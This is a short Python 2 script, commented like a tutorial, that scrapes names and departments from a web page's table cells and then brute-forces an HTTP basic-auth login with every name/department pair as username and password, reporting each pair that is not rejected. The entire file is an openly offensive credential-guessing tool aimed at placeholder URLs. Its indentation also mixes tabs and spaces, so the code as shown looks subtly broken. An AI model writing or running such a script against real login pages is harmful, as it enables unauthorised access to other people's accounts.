import requests
from bs4 import BeautifulSoup as bs4

# This script will parse the html code of the webpage and store all names and department info into variables, then use them to brute force a login page 

def downloadPage(url): # a string containing the URL will be the argument
  r = requests.get(url) # assign the output of the "get" function from the "requests" module to variable "r"
	response = r.content # "content" property to retrieve the content of the page
	return response #the function will return the content of the page via the "response" variable


def findNames(response):
	parser = bs4(response, 'html.parser') # page content passed to function and "html_parser". The initialized module will now be referred to as "parser" throughout the function
	names = parser.find_all('td', id='name') # defined variable "names" and assign to it all elements of type 'td' with id=name . i can change this parameters to whatever html code i want to retrieve text from
	output = [] # makes a list named output
	for name in names: # iterate over every element of the "names" list
		output.append(name.text) # add pure text of the "names" element without html to the "output" list
	return output # return the list with just text name


def findDepts(response):
	parser = bs4(response, 'html.parser')
	names = parser.find_all('td', id='department')
	output = []
	for name in names:
	        output.append(name.text)
	return output

def getAuthorized(url, username, password):
	r = requests.get(url, auth=(username, password))
	if str(r.status_code) != '401':
		print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n"

page = downloadPage("URL_OF_PAGE") # page URL in order to download content and stored it in the "page" variable

names = findNames(page) # assign a list of names retrieved from function "findNames" to the "names" variable
uniqNames = sorted(set(names)) # function "sorted(set(names))" we extract unique names in case some are repeated

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print "[+] Working... "
for name in uniqNames:
	for dept in uniqDepts: # nested loop - for each department in the list of unique departments
        	getAuthorized("URL_LOGIN_PATH", name, dept) # issue an authentication request with every possible combination of name / department - until both loops end
